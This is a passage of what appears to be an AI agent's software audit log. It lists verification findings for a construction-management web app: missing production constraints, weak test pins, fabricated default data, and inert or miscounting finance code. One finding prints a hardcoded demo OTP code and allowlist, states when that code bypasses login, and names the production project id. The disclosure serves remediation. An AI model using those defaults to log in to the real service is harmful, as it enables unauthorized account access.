# Verification-phase findings — R2-701 onward

Findings raised by the **independent verification** of findings the fix campaign has already
closed. Filed here, not in `audit/AUDIT_FIX_REGISTER.md`, because the other agent owns that file
and is running. Merge these rows into the register when it is idle.

**Id block R2-701..R2-799 is reserved for verification findings.** The register's highest id is
R2-601, so the fix campaign can keep allocating from 602 without collision.

**None of these reopens an existing row.** Each names the row it came from; that row keeps its
history and its status. See `docs/VERIFICATION_STRATEGY.md` (`git show
363d5a2:docs/VERIFICATION_STRATEGY.md`) for the rule.

Evidence source for the live rows: Supabase SQL editor against the production project
(`ujdxgiqafaobhrskzkmr`), 2026-08-21.

---

## Class A — closed `FIXED`, provably not in effect in production

### R2-701 · CRITICAL · six document-number unique constraints do not exist in production

**From:** R2-559 (`e0f2f6e`, status `FIXED`).
**Files:** `backend/app/models.py`, `supabase/migrations/` (absent).

R2-559 added six `UniqueConstraint` declarations to models.py — `purchase_orders(company_id,
po_number)`, `goods_receipt_notes(company_id, grn_number)`, `material_indents(company_id,
indent_number)`, `bills(company_id, invoice_number)`, `work_orders(company_id, wo_number)`,
`library_cost_codes(company_id, code)` — and **nothing else**. Its own commit message says
"Blast-radius: 1 file".

`Base.metadata.create_all` builds those constraints on a fresh SQLite test database, so `pytest`
passes. On Supabase the tables already exist, and the boot-time helper
`ensure_postgres_schema_sync` (`app/main.py:270`) adds **columns only** — it never emits a
constraint or an index. No migration file creates them either.

**Live evidence.** Constraints named `uq_*`: 0. Indexes named `uq_*`: 0. Sanity checks in the same
query returned 72 unique constraints and 156 unique indexes overall, so the query shape is sound.
Checked again by column set rather than by name, in case Postgres had auto-named them: on all six
tables the only unique index is `<table>_pkey` on `id`.

**Impact.** Duplicate PO, GRN, indent, bill, work-order and cost-code numbers are accepted in
production today. This is the exact defect R2-559 was raised to fix.

**Is this just deploy lag?** No, and the question is worth answering precisely because it applies
to every `NOT_IN_PROD` verdict.

- Both fixes are on **`origin/main`**, not only `campaign/waves` — `e0f2f6e` and `b4c0a37` are
  both ancestors of `origin/main`, which is what Render deploys.
- The running build is current. `bills.wo_id` exists in production, and the only mechanism that
  creates it is `ensure_postgres_schema_sync` running at boot against code that already contains
  `e2a6963` (2026-08-21 11:56). So the live instance booted from a build at or after that commit,
  which is three commits before the tip.
- **Most decisive: deploy currency cannot change the outcome.** A model-level `UniqueConstraint`
  has no path to Postgres at all. `create_all` only creates missing *tables*; the boot sync only
  adds *columns*. No amount of redeploying will produce these constraints — a migration is the
  only route, and none exists.

That is what separates `NOT_IN_PROD` from "not shipped yet". The test is not "is the commit
deployed" but "is there any mechanism by which this fix could take effect in the running system".

**Fix direction.** One migration creating the six unique indexes. **Do it now:** the duplicate
count is currently **zero** on all six pairs, so the migration applies cleanly. Once real
duplicates exist, `CREATE UNIQUE INDEX` fails and someone has to decide which row survives.

### R2-702 · HIGH · `company_team` membership uniqueness does not exist in production

**From:** R2-191 (`b4c0a37`, status `FIXED`).

Same mechanism as R2-701, for `UniqueConstraint(company_id, user_id)` on `company_team`. The only
unique index on that table in production is `company_team_pkey` on `id`, so the same person can
still be enrolled in one company twice.

Notable: **R2-191's own register note already says this** — *"prod needs a Supabase migration to
dedupe existing rows + CREATE UNIQUE INDEX (schema-sync only affects fresh DBs)"*. It was
correctly diagnosed and then closed `FIXED` anyway. Worth treating as a process signal, not just a
missing migration: a note that names remaining work should block closure.

---

## Class B — production defects found while verifying

### R2-703 · HIGH · `work_orders` has no primary key in production

The table exists and holds 2 rows, but has **no unique index at all** — not even
`work_orders_pkey`, while every sibling table (`bills`, `purchase_orders`,
`goods_receipt_notes`, `material_indents`, `library_cost_codes`, `company_team`) has one.

Not caused by the fix campaign; surfaced by the same query. Consequences to confirm: row identity,
replication, and any `ON CONFLICT` upsert against that table.

**Next step:** confirm whether the constraint is genuinely absent or merely unindexed, then add it
while the table holds 2 rows.

### R2-704 · MEDIUM · the Postgres schema auto-sync silently skips NOT NULL columns

`ensure_postgres_schema_sync` (`app/main.py:270`, called at boot from the lifespan at `:483`) adds
any missing model column to production with `ALTER TABLE ... ADD COLUMN IF NOT EXISTS`. A column
that is **non-nullable with no default** is skipped with a `print(...)` and execution continues.

Nothing is affected today — every column the campaign added is nullable. But the failure mode is
silent and deferred: a future `NOT NULL` column passes CI on SQLite, prints one line into Render's
log at boot, and never exists in production. The first query that selects it 500s.

**Fix direction.** Fail the boot, or emit a startup error the deploy surfaces. A `print` is not a
signal anyone reads.

---

## Class C — gates that do not gate

Each of these findings **is** correctly fixed — all five were checked and all five hold. The defect
here is that nothing protects the fix. A later edit removes it and the suite stays green. Verified by re-evaluating each pin's own
assertion against the fix commit's first parent, then reading the commit diff by hand.

### R2-705 · MEDIUM · `test_pin_R2_077_report_export_schemas_removed` watches the wrong file

Asserts `exportSchemas` is absent from `reports/[slug]/page.tsx`. That string **never existed** in
that file. The fix (`160aaec`) changed `reports/page.tsx`. Reintroducing `exportSchemas` in the
file that actually had it leaves the pin green.

### R2-706 · MEDIUM · `test_pin_R2_578_chat_server_stamps_sender_identity` asserts unchanged lines

Asserts `msg.user_id = ct.id` and `msg.user_name = current_user.name` are present in `chat.py`.
Both were already there pre-fix, at lines 153-154. The fix (`83d9cf0`) changed the **control flow**
around them — dropping the client-supplied `user_id`/`user_name` and raising 403 for a non-member.
None of that is tested. This one matters: the finding is an identity-spoofing fix.

### R2-707 · MEDIUM · `test_pin_R2_351_grn_transaction_keeps_po_item_unit` cannot see its own fix

Asserts `unit=po_item.unit` appears in `procurement.py`. It already appeared at line 672, a
different call site. The fix (`53b9499`) added a **second** occurrence at line 683. A substring
test cannot distinguish one occurrence from two; deleting the new line leaves the pin green.

### R2-708 · MEDIUM · `test_pin_R2_341_po_item_pending_qty_report` pins the label, not the value

Asserts `"PO Pending Qty"` is in `reports.py`. Pre-fix the file contained
`"PO Pending Qty": ""` — the column existed and was blank, which **was the defect**. The fix
(`57f78de`) computed the value. The pin passes against the broken version.

### R2-709 · LOW · `test_pin_R2_040_report_export_never_xlsx` asserts a string that never existed

Asserts `.xlsx` (with the dot) is absent from `reports/[slug]/page.tsx`. That literal is in neither
the pre-fix nor the post-fix file, so the assertion is vacuous. **Correction to an earlier draft of this entry:** I first wrote that the fix "only relabelled the
button" and that the underlying defect might survive. I have since checked it. The menu reads
*"Export as CSV (Excel-compatible)"* and the toast says CSV; `xlsx` survives only as an internal
format key, never as a claim to the user. **R2-040's fix is correct** — only its pin is vacuous.

### R2-710 · HIGH · the regression-pin suite tests source text, never behaviour

**The finding the five above are symptoms of.**

`backend/tests/coverage/test_regression_pins.py` is 1037 lines and 176 tests. It imports `pathlib`
and nothing else. 174 tests read a source file as text and assert a substring is present or
absent; one scans the filesystem for stock photos; **exactly one**
(`test_pin_R2_129_statutory_due_date_derivation`) imports application code and calls it. There is
no `TestClient` in the file and no HTTP request anywhere in it.

176 pins cover 177 of the 315 closed findings — so this is the primary evidence behind most
closures. A green pin proves the edit is still textually present. It cannot show the code is
reached, runs, or is correct, and it cannot catch a regression expressed as a change in behaviour
rather than a change in text. That is why every closed finding in
`docs/VERIFICATION_REGISTER.md` sits at `UNVERIFIED` and not `CONFIRMED`.

**Fix direction.** Not "rewrite 176 tests". Rank the closed findings by severity and give the
CRITICAL and HIGH ones a behavioural test that exercises the endpoint. Keep the text pins as a
cheap second layer — they are useful, they are just not evidence of correctness.

### R2-711 · MEDIUM · nothing gates a model constraint against having a migration

R2-701 and R2-702 are invisible to `pytest` **by construction**: `create_all` builds every
constraint on a fresh SQLite database, so a constraint with no migration is indistinguishable from
one that has a migration. The suite cannot fail.

**Fix direction.** A test that walks `Base.metadata` for every named `UniqueConstraint`/`Index` and
asserts a matching `CREATE ... INDEX`/`ADD CONSTRAINT` exists somewhere in `supabase/migrations/`.
Cheap, and it closes the whole class rather than the seven instances.

---

## Class D — one class finding

### R2-712 · CRITICAL · fabricated data is hardcoded into console forms that write real records

**Found while verifying:** R2-017 (CRITICAL, `FIXED`), by sweeping the defect class rather than
the four files that closure named. R2-017's own claim **verifies clean** — the four files it lists
are free of fabricated strings. The pattern simply lives in nine other places.

**This is one finding with many instances on purpose.** They share a single root cause and one
fixer can clear them in a single pass. Sub-ids R2-713..R2-716 were filed separately first and are
folded in below; they are kept in the table so the history is traceable.

**Sweep:** `scripts/verification/fabsweep.py`, run over all of `frontend/src/app/c`. It looks for
four shapes — entity names in `<option value>`, in `readOnly`/`defaultValue` inputs, as
`useState` defaults, and as fallback object arrays in `catch` blocks — and filters an explicit,
reviewable domain-vocabulary list so statuses and invoice types are not reported as data. It
self-tests against five hand-confirmed instances and against three known-vocabulary strings before
it will emit anything. 34 candidate sites; 20 survive triage as real instances.

#### Instances

| # | file | lines | what is hardcoded | should come from |
|---|---|---|---|---|
| 1 | `d/finance/page.tsx` | 2255, 2930 | `Prestige Developers` as the Material Transfer FROM party and header caption, `readOnly` | the signed-in company |
| 2 | `d/finance/page.tsx` | 2944-2945 | `Skyline Premium Towers`, `Grand Orchard Villas` as the only TO projects | `projects` |
| 3 | `d/finance/page.tsx` | 193-194, 3072-3073, 3083-3084, 3106-3107, 3122-3123 | `Main Savings Account (HDFC)`, `Escrow Account (SBI)`, `Petty Cash Account (HDFC)` on Internal Transfer, **and as the `useState` defaults** | `bank_accounts` / `cash_accounts` |
| 4 | `d/finance/page.tsx` | 150, 3354-3356, 3433-3436 | cost codes `1.2.1 Site Conveyance`, `2.1 Raw Materials`, `3.5 Subcontractor Labours` | `library_cost_codes` |
| 5 | `d/finance/page.tsx` | 165 | `Pune Site Office Address` as the Bill-To/Ship-To default | company addresses |
| 6 | `reports/item-wise-sales/page.tsx` | 88-90, 112-114 | clients `L&T Construction`, `Public Works Dept`, `Alpha Builders Ltd`; items `Reinforcement Steel`, `Ready Mix Concrete`, `OPC Cement` | parties / material library |
| 7 | `d/attendance/page.tsx` | 179, 1260-1262 | branches `Pune Main Office (Branch #1)`, `Mumbai Central (Branch #2)` | company addresses |
| 8 | `p/[project_id]/attendance/page.tsx` | 1257-1258 | same two branches | same |
| 9 | `d/procurement/page.tsx` | 259 | `DPR Column C-1 concrete pour` as the source-reference default | the referenced DPR |
| 10 | `d/subcon/work-orders/amendments/page.tsx` | 39 | `Project Manager` as the `amendedBy` default | the authenticated user |
| 11 | `dashboard/page.tsx` | 131-134 | **four** fabricated fallbacks in one object literal — `health \|\| "Healthy"`, `status \|\| "Ongoing"`, `startDate \|\| today`, `endDate \|\| "2027-12-31"` | absent should render `—`, as its neighbours already do. See R2-083 below |

**Borderline, deliberately excluded** — flagging so nobody re-files them: `transferType` defaults to
`"Bank To Bank"` (a typed union, legitimate); `purchaseLedgerInput`/`salesLedger` default to
`Purchase A/c`/`Sales A/c` (standard Tally ledger names); `rateCategory` defaults to `Civil Works`.
These are defaults drawn from vocabulary, not invented records.

#### The two that matter most

**Instance 3 is a money path.** Internal Transfer moves funds between three accounts, and the
component state *defaults* to those literals, so a form submitted without touching either dropdown
still carries them. Two independent rungs of evidence: the browser shows exactly those options in
production for the test company *ZZ R8 Throwaway*, and Supabase shows **`bank_accounts` holds zero
rows for the entire database** — no account by any of those names exists for anyone. Account
selection is a free-text string, not a foreign key. What the endpoint persists should be checked
before anyone transfers anything.

**Instance 2 makes Material Transfer unusable.** The tenant's real projects are absent from the TO
list, so a transfer can only be addressed to a project that does not exist. Verified live; the
project picker beside it was still rendering `Loading projects...` from the real API while this one
was already populated with invented values.

#### A separate bug found inside instance 4

```
<option value="1.2.1 Site Conveyance">Select Cost Code</option>
```

The **placeholder option carries a real-looking value.** A user who never opens the dropdown, or
who deliberately picks "Select Cost Code", silently submits the cost code `1.2.1 Site Conveyance`.
The same shape appears at `d/attendance/page.tsx:179`, where `company_branch` initialises to the
literal `"Select Company Address"` — there the placeholder is submitted as data instead. Both are
the placeholder-is-a-value error; they just fail in opposite directions.

#### Why the campaign missed it

Not carelessness — **scope**. R2-017 was filed against the dashboard, and the fix cleaned the four
files the finding named. Its note even counts the lines removed from `item-wise-sales` (`-3`); three
fabricated options went and six remained in that same file, because the closure was measured
against the finding text rather than against the file.

**Fix direction.** One pass, not eleven. Every instance is the same edit: replace the literal with
the fetch the page already performs elsewhere, and give every placeholder option `value=""`. Then a
lint rule or a test asserting no `<option value>` in `app/c` matches a proper-noun pattern outside
the vocabulary list, so the class cannot return.

## Class E — one class finding

### R2-717 · HIGH · 29 closed findings disclose unresolved work in their own note and carry no tracking id

**Method.** Every closed row's note was matched against explicit hand-off phrasing — `Sibling:`,
`follow-up`, `is deferred`, `not implemented`, `left open`, `remains open`, `out of scope`. Loose
matches on the bare word "still" were excluded because they produce false positives on innocent
phrasing.

**40 of the 315 closed rows disclose unresolved work. 11 name a tracking id. 29 do not.**
By severity of the parent row: 1 CRITICAL, 3 HIGH, 24 MEDIUM, 1 LOW.

This is the same shape as R2-191, which wrote *"prod needs a Supabase migration to dedupe existing
rows + CREATE UNIQUE INDEX"* into its note and was then closed `FIXED` — the remaining work was
identified honestly and then lost, because a note is not a queue. The disclosure is good practice.
The gap is that nothing converts it into a tracked row.

#### Notable instances

**R2-068 (parent CRITICAL) — the disclosure understates it.** The note says `gatePhotoUrl` is
*"an in-session objectURL — nothing persists it server-side"*. What the code actually does
(`d/procurement/page.tsx:1066-1069`):

```
if (f) setGrnGatePhoto(URL.createObjectURL(f));
...
{grnGatePhoto && <span className="text-emerald-400 font-bold mt-1 block">✓ Photo Attached</span>}
```

The user selects a GRN gate photo, is told **"✓ Photo Attached"** in green, and the file is
discarded on navigation. It is never sent — `photo_url` appears nowhere in the request, and the
`gatePhotoUrl` type field at `:66` is now referenced by nothing. So this is not merely a missing
upload: it is a **fabricated success affirmation**, which is the exact defect class R2-068 was
raised to remove. The fix deleted the stock-photo URL and left the false confirmation in place.

**R2-007 (parent HIGH)** — `handleCreatePO` still prepends the PO row optimistically even when the
POST fails. The note names it "the same fake-optimistic family" and defers it. Untracked.

**R2-008 (parent HIGH)** — wiring the RFQ drawer to the real `rfq.py` endpoints is deferred pending
an API contract. The fabricated data is gone and the empty state is honest, so the parent closure
is sound, but the feature is inert and nothing tracks finishing it.

**R2-336 (parent MEDIUM)** — *"Sibling: `inv.unit` still overwritten by the movement"*. The fix
stopped material movements reclassifying the inventory master **category**; the same last-write-wins
overwrite on **unit** survives, disclosed and untracked.

**R2-378 (parent MEDIUM)** — *"Sibling: `LibraryRetention` still unreferenced by the write path"*.

#### Why this matters more than the individual items

Each parent closure is defensible — the finding as filed was fixed, and the residue was stated
plainly rather than hidden. But 29 pieces of known remaining work now exist only inside prose in a
column of a register, where no worklist, no count and no severity triage can reach them. They are
invisible to the campaign's own "how much is left" figure.

**Fix direction.** Two steps, both cheap. Sweep the 29 notes and open a row for each piece of
residue, inheriting a severity of its own rather than the parent's. Then make the closure checklist
refuse a `FIXED` whose note contains hand-off phrasing without an accompanying id — the same shape
as R2-711, a rule that closes the class rather than the instances.

### R2-083 · the CRITICAL closure that claims completeness it does not have

Not a separate finding — it is instance 11 above, recorded here because *how* it was closed is the
point.

R2-083 (**CRITICAL**, `FIXED`, `b8e314b`, note: *"No test added"*) states:

> the **last two** fabricated attribute fallbacks on real projects are gone

Its diff is exactly two lines:

```
-  category: dbProj.category || "General",     +  category: dbProj.category || "—",
-  projectStage: dbProj.stage || "Structure"   +  projectStage: dbProj.stage || "—"
```

Both edits are correct. The completeness claim is not. **Four fabricated fallbacks remain in the
same object literal**, two of them directly above the lines that were changed:

```
status:    dbProj.status     || "Ongoing",
health:    uiHealth          || "Healthy",
startDate: dbProj.start_date || new Date().toISOString().split('T')[0],
endDate:   dbProj.end_date   || "2027-12-31",
```

**`health || "Healthy"` is the serious one.** `uiHealth` is `dbProj.health` (null when the database
has none), so a project with no health value is rendered with a **green "Healthy" badge**
(`:991`) and counted in `healthyCount` (`:483`). A dashboard risk indicator defaults to the
reassuring answer when it has no data. `status || "Ongoing"` does the same for project status.

The author changed two adjacent lines and described them as the last two, without re-reading the
eight-line block they sit in. With no test and no pin on this row, nothing else could have caught
it.

## Class F — one class finding

### R2-718 · HIGH · 169 of 315 closed findings have no automated gate of any kind

**Distinct from R2-710.** That finding says the pins test source text rather than behaviour. This
one says that for most closures **there is no pin at all**.

| cut | count |
|---|---|
| closed findings in the pinned snapshot | 315 |
| **with no `REAL_GATE` pin** | **169** — 61 CRITICAL, 43 HIGH, 55 MEDIUM, 10 LOW |
| note explicitly says "No test added" | 43 — 5 CRITICAL, 9 HIGH |
| **both: no pin and no test** → zero automated evidence | **28** — 4 CRITICAL, 6 HIGH |

So of 315 closures, 146 have a text pin (which R2-710 shows proves only textual presence), and 169
have nothing. **61 CRITICAL findings are closed with no automated gate.** If any of them is undone
by a later edit, the suite stays green and the register still reads `FIXED`.

The four CRITICAL rows with neither a pin nor a test are R2-050, R2-051, R2-060 and R2-083. R2-083
is the one written up immediately above — closed on a claim that is demonstrably wrong, with
nothing in place to detect it. That is what this class costs in practice, not in theory.

**Fix direction.** Not 169 tests. Take the 61 CRITICAL closures, and for each ask whether a
behavioural test is possible; where it is, write it, and where it is not, record why in the row so
the absence is a decision rather than an omission. The 28 zero-evidence rows are the place to
start, because they are the only ones where *nothing* would notice a regression.

## Class G — one class finding

### R2-719 · CRITICAL · absent data is coalesced into an invented definite value in 90 places, including 8 sentinel UUIDs that resolve to real production rows

**Found by generalising R2-083.** Sweep: `scripts/verification/defaultsweep.py`, over all of
`frontend/src/app/c`. It reports `X || "literal"` and `X ?? "literal"`, and classifies the fallback
by whether it **admits absence** (`—`, `N/A`, `Unassigned`, `Unknown`) or **asserts a fact**. It
self-tests on the three known R2-083 lines and on the honest `category || "—"` sibling in the same
object literal before it will emit anything.

**90 data-fabrication sites. 68 further sites excluded as legitimate** — `err.detail || "Save
failed"` is a message shown to a human, not a value written to a record. The exclusion count is
reported so it is visible rather than silent.

#### Tier 1 — sentinel UUIDs that point at real rows (11 fallback sites, corrected)

**Count corrected 2026-08-22, upward.** I first reported 8 sites. `defaultsweep.py` matches
`X || "literal"` and therefore missed the ternary form
(`typeof window !== "undefined" ? localStorage.getItem(...) || "…" : "…"`). A direct grep for the
sentinel finds **16 occurrences across 13 files**, which resolve into three groups — and the third
group is not a defect at all:

**Group 1 — company-id fallbacks (11 sites, the defect):** `d/chat:38`, `d/help:13`,
`d/mom:48`, `d/quality:106`, `d/services:20`, `d/subcon:31`, `p/[project_id]/mom:46`,
`p/[project_id]/quality:105`, `reports/dpr:12`, `reports/item-wise-sales:12`,
`reports/[slug]:485`.

**Group 2 — user-id fallbacks (2 sites, a different shape):** `d/chat:133` and `:181` default
`currentLoggedUserId` to the **company** sentinel UUID when `localStorage.getItem("user_id")` is
absent. A user id defaulting to a company id is wrong independently of which tenant it names.

**Group 3 — guards, NOT defects (3 sites):** `layout.tsx:44,46` detects the sentinel in the route
and rewrites the path away from it, and `projects/page.tsx:62` checks for it explicitly. **The
codebase already contains the correct handling** — it just is not applied at the 11 fallback sites.
That materially improves the fix direction: copy the existing guard, do not invent one.

**One qualification on Group 3's protection.** The layout guard fires when `company_id` *equals*
the sentinel. The Group 1 fallbacks fire when `company_id` is *missing*, in which case the guard's
equality test is false and does not trigger. So the guard does not cover the fallback case.

**These are not dead sentinels. Both rows exist in the production database:**

- `companies e0000000-…-000000000000` → **"Demo Construction Ltd"**, holding **5 projects**
- `users e0000000-…-000000000100` → **"Demo Engineer" / demo@siteflow.co**

So whenever `useParams()` has not resolved the route segment, six console pages — chat, services,
subcon and three report pages — issue their fetches against a **real tenant that is not the
signed-in one**, and will render its projects. It is a demo tenant rather than a paying customer,
which caps the blast radius, but it is a real row, visible to RLS, and the pages cannot tell the
difference.

The attendance pair is worse because it **writes**. `queuePunch` guards with
`if (!selectedEmpId && employees.length > 0) return`, so when the roster is *empty* the guard does
not fire and the punch is queued against **Demo Engineer**. `attendance_logs` currently holds zero
rows for that id, so this has not happened in production yet.

**That a demo tenant carrying 5 projects exists in the production database at all** needs its own
decision, independent of this finding.

#### Tier 2 — risk indicators that default to reassuring (10 sites, 4 files)

```
dashboard/page.tsx:131-132      dbProj.status || "Ongoing"    uiHealth || "Healthy"
d/home/page.tsx:60,73           project.status || "Ongoing"   project.health || "Healthy"
p/[project_id]/layout.tsx:60,62 data.status || "Ongoing"
p/[project_id]/party/page.tsx:75,89,178,183   p.status || "Active"
```

R2-083's `health` case is not isolated: `d/home` defaults status and health the same way, and party
status defaults to `Active` in four places. A dashboard health badge and a party's active flag are
both decision inputs, and both silently read "fine" when the data is missing.

#### Tier 3 — fabricated values on paths that matter (selection from 71)

| site | fallback | why it matters |
|---|---|---|
| `d/dpr/page.tsx:138` | `reportedBy \|\| "Site Engineer"` | actor-from-client on a signed daily report |
| `d/chat/page.tsx:530-531` | `msg.user_name \|\| "SiteFlow"` | a message with no sender is attributed to the product |
| `d/finance/page.tsx:3305,3320,3870` | `u.role \|\| "Staff"` / `"Employee"` | role drives approval rights |
| `d/finance/page.tsx:463-464,474,490` | `name \|\| "Sender"` / `"Receiver"`, `refNum \|\| "P2P-OUT"` | party and reference on a money transfer |
| `d/attendance/page.tsx:423` | `customMultiplierVal \|\| "1.0"` | payroll multiplier |
| `d/payroll-attendance/page.tsx:289,311,752-753,765-766` | `day_off \|\| "Sunday"`, `shift_start \|\| "09:00"`, `shift_end \|\| "18:00"` | payroll shift window |
| `d/attendance/page.tsx:658`, `d/hr/page.tsx:722,1153` | `designation \|\| "Labor"` / `"Staff"` | wage-band adjacent |

**Fix direction.** Tier 1 first, on its own terms: a missing route param must fail loudly rather
than fall back to an id, and the demo tenant needs a decision. Tier 2 is a mechanical edit to the
honest form these same files already use elsewhere. Tier 3 needs judgement per site — some are
defensible product defaults and some are fabrications, so the table above is triage, not verdict.
Then a lint rule forbidding a non-honest string literal on the right of `||` where the left is a
fetched field, so the class cannot regrow.

## Class H

### R2-720 · HIGH · Internal Transfer is completely inert — Save fires no request and reports nothing

**Found while discharging D-V3**, which asked what the Internal Transfer endpoint persists. The
answer is: nothing, because no request is ever made.

**Cause.** The drawer's Save calls `handleRecordPayment` (`d/finance/page.tsx:436`). That function
branches for `"Party to Party"` and then falls through to:

```
if (!amount || amtVal <= 0 || !partyName.trim()) return;
```

The Internal Transfer form has **no party field at all** — it collects From Bank, To Bank, Amount,
Reference No and Notes. `partyName` is therefore empty, the guard hits a **bare `return` with no
alert**, and the handler exits. `fromBank` and `toBank` are never read outside the JSX, so the
account selection is not sent anywhere either.

**Live evidence, production, test company ZZ R8 Throwaway.** Opened Finance → Transaction →
+ Internal Transfer, typed an amount of 2500 with real keystrokes, clicked Save:

- `window.fetch` instrumentation recorded **zero calls**
- the drawer stayed open, with the amount still showing 2500
- no alert, no toast, no console error

The instrumentation was then validated with a positive control (a deliberate `fetch` to
`/favicon.ico` was captured), so the empty result is a real absence and not a lost hook.

`"Cash Deposit"` and `"Cash Withdraw"` share the same handler and the same missing party field, so
all three transfer types are inert.

**This changes D-V3 rather than confirming it.** The concern was that a money path was writing
account names matching no record. It writes nothing. That removes the data-integrity worry and
replaces it with a plain one: **a money-movement feature that appears to work and does nothing**,
with no error to tell the user. Same family as the silent-write-control class.

**Fix direction.** Give Internal Transfer its own handler and endpoint, or — if the backend route
does not exist yet — remove the control, per the audit's standing preference for an honest absence
over a decorative affordance. At minimum the bare `return` must become a visible error; a Save
button that silently does nothing is the worst of the three options.

### R2-721 · MEDIUM · `report_type` is an unvalidated free-text discriminator on the statutory path

**Found while verifying R2-129**, whose fix is correct.

`StatutoryReportCreate.report_type` is a bare `str` (`statutory.py:18`) with no `Literal`, pattern
or enum anywhere. Three separate behaviours then key off an **exact lowercase** match:

| site | comparison | consequence when the case differs |
|---|---|---|
| `calculate_due_date` (:66-69) | `== "tds"`, `in ("pf","esi","bocw")` | returns `None` — the report is stored **with no due date** |
| BOCW cess (:145) | `report_type == "bocw"` | cess computed as **zero** |
| list filter (:96) | `StatutoryReport.report_type == report_type` | the report is invisible to its own filter |

Executed to confirm: `calculate_due_date("pf", "2026-01")` returns 2026-02-15, while
`calculate_due_date("PF", "2026-01")` and `("Pf", …)` both return `None`. No exception, no 422 —
the report simply saves without a due date.

**Latent, not live.** The console defaults `report_type: "pf"` (`d/statutory/page.tsx:52`) and
sends lowercase throughout, so the UI cannot currently trigger it. The exposure is the API surface:
BI keys, integrations, and any future screen that sends a display-cased value.

**This is a sibling of a class the campaign is already fixing** — R2-136 validated the planning
discriminators, R2-580 constrained project status, R2-293 constrained the Tally vocabulary, R2-582
constrained party status. Statutory was not swept.

**Fix direction.** `report_type: Literal["pf", "esi", "bocw", "tds"]`, matching how the other
discriminators were closed. One line, and it converts three silent wrong answers into a 422.

### R2-722 · HIGH · the demo tenant is still actively recreated, and a fixed OTP can reach it

**Found while verifying R2-183.** It also **corrects a claim I made in D-V1** — I wrote that
nothing recreates the demo tenant. That was wrong.

`auth.py:186` defines `_ensure_demo_company`, which creates the company
`e0000000-…-000000000000` ("Demo Construction Ltd", GSTIN `27AADCD2424B1ZP`) and then calls
`_seed_demo_projects` — which is where the 5 projects in production come from. It is invoked at
`auth.py:415` on **any successful login by an allowlisted demo number**, unconditionally:

```
if _is_demo_mobile(mobile):
    company = _ensure_demo_company(db)
```

R2-115 removed the *settings* endpoint's INSERT, correctly and verifiably. This is a **second,
independent creation path** in a different router that the R2-115 closure did not cover — and
nothing in the register points at it.

#### The allowlist and code are defaults in the source

```
backend/app/config.py:43   OTP_DEMO_ALLOWLIST: str = "9876543210,+919876543210"
backend/app/config.py:44   OTP_DEMO_CODE: str = "123456"
backend/app/config.py:65   EMAIL_OTP_DEMO_ALLOWLIST: str = "demo@siteflow.co"
```

**State the precondition precisely, because it decides the severity.** `send_otp` sets
`use_demo_code = is_demo and not provider_ready`. So the fixed code `123456` is accepted **only
when no SMS provider is configured**. With SMS wired, an allowlisted number receives a real random
OTP and there is no bypass.

**What is unconditional either way** is the tenant recreation at `:415` — that runs on any
successful demo-number login, configured provider or not.

#### What I did not test, and why

Distinguishing "SMS configured" from "not configured" on the live server means calling
`/auth/send-otp`, which sends a real message to whatever number is submitted. I did not do that:
probing it with an invented number risks messaging a real handset, and probing with the demo number
tells me nothing about `provider_ready`. **This needs the founder to check the Render environment**
for `SMS`/`OTP_DEMO_ALLOWLIST` overrides — added to the decisions file as D-V5.

#### Scope of the fix — swept, and it is bounded

I swept the backend for other demo/seed materialisation paths so the fix does not turn into a hunt:
`_seed_demo_projects` and `_ensure_demo_company` (both `auth.py`) are the **only** two. The one
other seeder, `seed_default_roles` (`settings.py:465`), is a legitimate RBAC preset and is not demo
data.

The **email** demo path (`EMAIL_OTP_DEMO_ALLOWLIST`, default `demo@siteflow.co`) gates a fixed code
the same way when SMTP is unconfigured, but it does **not** call `_ensure_demo_company` — only the
mobile path at `:415` does. So the tenant-creation defect is one call site, and the fixed-code
question covers two.

**Fix direction.** Independent of the env answer: the allowlist and demo code should have **no
usable defaults in source** (empty string, so an unset env disables the path entirely), and
`_ensure_demo_company` should not run on a production deploy at all. If a demo tenant is wanted,
it should be seeded deliberately rather than materialised by a login.

### R2-723 · HIGH · cancelled bills still count toward budget, BI and tower actuals — 8 sites

**Found while verifying R2-045/R2-066.** Both of those closures are correct; the inconsistency was
visible beside them.

R2-232 (CRITICAL, `FIX_VERIFIED`) added Cancelled-exclusion "across bill aggregations". It reached
`finance.py`. It did not reach `budget.py`, `towers.py` or `bi_export.py`.

**Sweep result — 8 of 18 bill aggregations omit the exclusion, and they cluster:**

| file:line | aggregation | invoice types |
|---|---|---|
| `bi_export.py:279` | `equipment_actual` (BI budget-variance feed) | `equipment` |
| `budget.py:108` | `equipment_bills` | `equipment` |
| `budget.py:86` | `material_actual` | `purchase` |
| `budget.py:98` | `subcon_actual` | `subcon` |
| `budget.py:163` | overall-project `actual` (no-towers branch) | `EXPENSE_INVOICE_TYPES` |
| `budget.py:175` | per-tower `actual` | `EXPENSE_INVOICE_TYPES` |
| `towers.py:175` | `total_billed` | `REVENUE_INVOICE_TYPES` |
| `towers.py:193` | `total_billed` | `REVENUE_INVOICE_TYPES` |

The other 10 aggregations — the `finance.py` family R2-232 actually touched — all carry
`status != "Cancelled"`. So this is a **missed set of call sites for a fix that is otherwise
correct**, not a wrong fix.

**The tell that it was an oversight rather than a decision:** `budget.py:92-94`, sitting between two
of the unguarded bill queries, *does* exclude cancelled work orders —
`WorkOrder.status != "cancelled"`. Cancellation was on the author's mind in that exact function;
bills were simply not swept.

**Impact.** Cancelling a bill reduces it in Finance and leaves it counted in Budget vs Actual, the
tower breakdown and the BI feed. Two surfaces disagree about the same money, and the BI feed is the
one customers point their own reporting at.

**Not yet quantified against live data.** Production currently holds no cancelled bills to
demonstrate the divergence, so this is a code-level finding with an obvious mechanism rather than an
observed wrong number. Worth stating plainly: the reasoning is sound, the demonstration is pending
data.

**Fix direction.** One predicate added at 8 call sites. Better, since the sweep shows the pattern
recurs: a shared helper (`_active_bills(db, project_id, types)`) that every aggregation goes
through, so the next aggregation cannot forget it — the same close-the-class shape as R2-711.

### R2-724 · **RETRACTED** · branch GSTIN does run the checksum; I misread the class boundary

**Filed and withdrawn on 2026-08-22. Kept here because retractions belong in the record.**

I claimed `BranchCreate.gstin` was pattern-only and skipped the mod-36 check digit that company
GSTIN enforces. **That is wrong.** `BranchCreate` spans `settings.py:152-165` and carries *both*:

```
152  class BranchCreate(BaseModel):
154      gstin: str = Field(..., pattern=r"^[0-9]{2}[A-Z]{5}...")
163      _check_gstin = field_validator("gstin")(_validate_gstin)
```

**How I got it wrong.** A grep returned `_check_gstin` bindings at `:149` and `:163` and a pattern
Field at `:154`. I assumed the two bindings belonged to the two *company* schemas and that the
pattern at `:154` was therefore branch's only validation. I never resolved which class owned
